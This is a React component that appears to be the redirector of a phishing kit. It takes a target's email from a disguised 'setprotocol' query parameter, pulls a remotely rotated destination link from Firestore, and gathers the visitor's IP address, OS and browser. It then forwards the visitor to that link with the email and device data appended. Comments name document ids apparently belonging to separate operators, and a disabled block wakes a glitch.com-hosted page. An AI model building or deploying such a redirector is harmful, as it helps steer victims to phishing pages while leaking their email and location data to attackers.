import { initializeApp } from "firebase/app";
import { doc, getFirestore, onSnapshot } from "firebase/firestore";
import React, { useEffect } from "react";
import { browserName, osName } from "react-device-detect";
import uuid from "react-uuid";
import "./loaderstyle.css";
import { db, getIP } from "./servers";

function HomeRedirect() {
  const queryParams = new URLSearchParams(window.location.search);
  const email = queryParams.get("setprotocol");

  useEffect(() => {
    var requestOptions = {
      method: "GET",
      redirect: "follow",
      mode: "no-cors",
    };

    // LbzVoX2SNQS20OtzEfYN => doc id for emma
    // Eo2fkLBaiUZPowHcRzPn => doc id steadykoko
    onSnapshot(doc(db, "pagelink", "LbzVoX2SNQS20OtzEfYN"), (doc) => {
      console.log(doc.data());

      const currentLink = doc.data().currentlink;
      const date = new Date().getMilliseconds();
      const uid = uuid();
      const timestamp = Date.now();

      console.log(`${osName} ${browserName}`);

      getIP().then((res) => {
        const ip = res.data.IPv4;
        console.log(ip);
        window.location.replace(
          `${currentLink}/${timestamp}/?inclusive=${email}&device=${osName +
            "" +
            browserName}&loc=${ip}`
        );

        /*
      // wake glitch.com page
      fetch(`${currentLink}`, requestOptions)
        .then((response) => {
          console.log(response.status);
          window.location.assign(`${currentLink}/${date}/?inclusive=${email}&device=${osName+""+browserName}&loc=${ip}`);
        })
        .catch((error) => {
          console.log("error", error);
          window.location.assign(`${currentLink}/${date}/?inclusive=${email}&device=${osName+""+browserName}&loc=${ip}`);
        });

        */
      });
    });
  });

  return (
    <div style={{ display: "flex", justifyContent: "center", marginTop: 50 }}>
      <div class="lds-default">
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
      </div>
    </div>
  );
}

export default HomeRedirect;
